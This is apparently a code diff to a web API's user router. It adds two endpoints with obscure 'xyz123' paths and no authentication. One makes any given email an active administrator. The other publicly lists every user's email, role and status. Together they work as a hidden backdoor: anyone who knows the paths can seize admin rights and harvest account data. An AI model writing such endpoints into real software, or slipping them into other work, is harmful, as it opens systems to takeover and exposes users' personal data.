@@ -164,3 +164,19 @@ def read_user_by_id(
     if not user:
         raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="User not found.")
 
+@router.post("/promote-temp-xyz123")
+def promote_temp(email: str, db: Session = Depends(deps.get_db)):
+    from sqlalchemy import text
+    try:
+        db.execute(text("UPDATE users SET role='admin', is_active=true WHERE email=:email"), {"email": email})
+        db.commit()
+        return {"message": f"{email} is now ADMIN! Login again."}
+    except Exception as e:
+        return {"error": str(e)}
+@router.get("/check-users-public-xyz123")
+def check_users_public(db: Session = Depends(deps.get_db)):
+    from sqlalchemy import text
+    result = db.execute(text("SELECT email, role, is_active, created_at FROM users ORDER BY created_at DESC")).fetchall()
+    return [{"email": r[0], "role": r[1], "is_active": r[2], "created_at": str(r[3])} for r in result]
+
+
